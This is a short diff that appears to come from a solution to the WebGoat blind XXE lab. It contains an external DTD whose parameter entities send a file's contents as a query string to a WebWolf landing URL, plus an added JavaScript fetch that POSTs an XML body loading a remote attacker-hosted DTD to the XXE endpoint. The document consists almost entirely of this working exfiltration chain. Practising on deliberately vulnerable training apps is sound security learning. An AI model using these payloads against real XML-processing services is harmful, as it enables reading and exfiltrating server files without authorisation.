@@ -2,3 +2,15 @@
 <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://127.0.0.1:8002/WebWolf/landing?secret=%file;'>">
 %eval;
 %exfil;
+
+fetch('http://192.168.254.112:8001/WebGoat/xxe/blind', {
+  method: 'POST',
+  credentials: 'include',
+  headers: {'Content-Type': 'application/xml'},
+  body: `<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY % remote SYSTEM "http://192.168.254.112:8002/files/nooniman/attack_remote.dtd">
+  %remote;
+]>
+<comment><text>Blind XXE Attack</text></comment>`
+}).then(r => r.text()).then(console.log);
